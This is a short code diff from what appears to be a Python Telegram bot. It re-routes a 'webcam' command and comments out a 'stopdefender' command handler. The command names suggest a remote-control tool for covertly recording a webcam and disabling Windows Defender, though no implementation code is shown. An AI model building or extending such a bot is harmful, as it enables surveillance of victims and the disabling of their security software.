@@ -19,8 +19,8 @@ if __name__ == '__main__':
     # Register command handlers
     app.add_handler(CommandHandler('banner', banner_command))
     app.add_handler(CommandHandler('help', help_command))
-    app.add_handler(CommandHandler('webcam', record_command))
-    app.add_handler(CommandHandler('stopdefender', stop_defender))
+    app.add_handler(CommandHandler('webcam', cam_command))
+    # app.add_handler(CommandHandler('stopdefender', custom_command))
 
     # Register message handler
     app.add_handler(MessageHandler(filters.TEXT, no_command))
